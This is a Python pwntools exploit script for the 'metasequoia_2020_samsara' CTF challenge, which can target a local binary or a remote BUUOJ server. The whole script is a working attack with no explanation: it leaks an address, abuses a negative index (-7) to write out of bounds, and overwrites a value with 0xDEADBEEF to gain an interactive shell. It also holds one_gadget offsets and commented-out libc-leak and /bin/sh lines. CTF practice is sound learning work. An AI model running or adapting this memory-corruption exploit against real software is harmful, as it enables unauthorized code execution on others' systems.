import sys
from pwn import *
from ctypes import *
context.log_level='debug'
#context.arch='amd64'
while True :
	# try :
		if len(sys.argv)==1 :
			io=process('./metasequoia_2020_samsara')
			# io=process(['./'],env={'LD_PRELOAD':'./'})
			elf=ELF('./metasequoia_2020_samsara')
			libc=ELF('/lib/x86_64-linux-gnu/libc.so.6')
			one_gadgaet=[0x45216,0x4526a,0xf02a4,0xf1147]
		else :
			io=remote('node3.buuoj.cn',27908)
			elf=ELF('./metasequoia_2020_samsara')
			libc=ELF('/lib/x86_64-linux-gnu/libc.so.6')
			one_gadgaet=[0x45216,0x4526a,0xf02a4,0xf1147]

		def add(a,b,c):
			io.sendlineafter('4.show\n','1')
			io.sendlineafter('index:\n',str(a))
			io.sendlineafter('size:\n',str(b))
			io.sendafter('content:\n',c)

		def delete(a):
			io.sendlineafter('4.show\n','2')
			io.sendlineafter('index:\n',str(a))

		def edit(a,c):
			io.sendlineafter('4.show\n','3')
			io.sendlineafter('index:\n',str(a))
			io.sendafter('content:\n',c)

		def show(a):
			io.sendlineafter('4.show\n','4')
			io.sendlineafter('index:\n',str(a))

		io.recv()
		io.sendline('4')
		io.recvuntil('0x')
		data=int(io.recvline(),16)
		io.recv()
		io.sendline('3')
		io.recv()
		io.sendline('-7')
		io.recv()
		io.sendline(str(data+8))
		io.recv()
		io.sendline('3')
		io.recv()
		io.sendline('-7')
		io.recv()
		io.sendline(str(0xDEADBEEF))
		io.recv()
		io.sendline('6')



		


		# libc_base=u64(io.recv(6)+'\x00\x00')-libc.sym['__malloc_hook']-88-0x10
		# libc.address=libc_base
		# system_addr=libc.sym['system']
		# bin_sh_addr=libc.search('/bin/sh\x00').next()
		# success('libc_base:'+hex(libc_base))
		# gdb.attach(io)
		# pause()
		io.interactive()

	# except Exception as e:
	# 	io.close()
	# 	continue
	# else:
	# 	continue